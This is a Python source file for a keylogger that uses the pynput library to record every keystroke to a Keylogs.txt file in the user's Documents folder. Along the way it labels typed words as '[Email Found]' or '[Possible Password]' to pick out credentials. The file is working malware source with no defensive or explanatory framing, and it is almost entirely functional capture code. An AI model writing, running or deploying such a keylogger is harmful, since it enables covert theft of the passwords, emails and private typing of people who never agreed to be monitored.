from pynput.keyboard import Key, Listener
import re
import os

# Log file location
log_file = os.path.join(os.path.expanduser("~"), "Documents", "Keylogs.txt")

# Buffer to store current word being typed
buffer = ""

def process_key(key):
    global buffer
    if key == " " or key == "\n":  # If space or enter, process the word
        if buffer:
            check_for_email_or_password(buffer)
            write_to_file(buffer)
            buffer = ""  # Clear the buffer after processing
        if key == "\n":
            write_to_file("[ENTER]")
        else:
            write_to_file("[SPACE]")
    elif key == "[BACKSPACE]":  # Handle backspace
        buffer = buffer[:-1]  # Remove last character in buffer
    else:
        buffer += key  # Add character to buffer

def check_for_email_or_password(word):
    # Check if the word is an email
    email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
    if re.match(email_pattern, word):
        write_to_file(f"[Email Found] -> {word}")
    # Check if the word is a possible password
    if len(word) >= 8 and not re.match(email_pattern, word):
        write_to_file(f"[Possible Password] -> {word}")

def write_to_file(content):
    with open(log_file, "a") as file:
        file.write(content + "\n")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:  # Check if it's a printable character
            process_key(key.char)
        else:
            handle_special_key(key)
    except Exception as e:
        write_to_file(f"[Error] -> {e}")

def handle_special_key(key):
    if key == Key.space:
        process_key(" ")
    elif key == Key.enter:
        process_key("\n")
    elif key == Key.backspace:
        process_key("[BACKSPACE]")

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()

